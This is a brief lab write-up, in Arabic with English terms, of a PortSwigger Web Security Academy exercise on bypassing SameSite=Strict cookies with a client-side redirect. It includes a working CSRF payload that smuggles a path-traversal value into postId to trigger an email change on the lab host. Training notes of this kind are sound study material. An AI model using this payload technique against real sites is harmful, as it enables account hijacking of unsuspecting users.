# Lab : SameSite Strict bypass via client-side redirect

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

- الفكره من الLab ده انك تستغل ان في ثغره CSRF ةتستغل ان parameter the email مصاب وتغير الايميل ولاكن الموقع معمله Samesite = Strict فا مش هعرف اجيب حاجه من بره لازم احاول اعمل redirect من نفس المصدر علشان تبقي الcookies مبعوته معاه علي شان من نفس المصدر
- كان في redirect في الموقع في الcomment استغللناها

```bash
1. <script>
document.location="https://0ac800ff03d0971c80bbb73c004c0097.web-security-academy.net/post/comment/confirmation?postId=7/../../my-account/change-email?email=test3%40test.com%26submit=1";
</script>
```
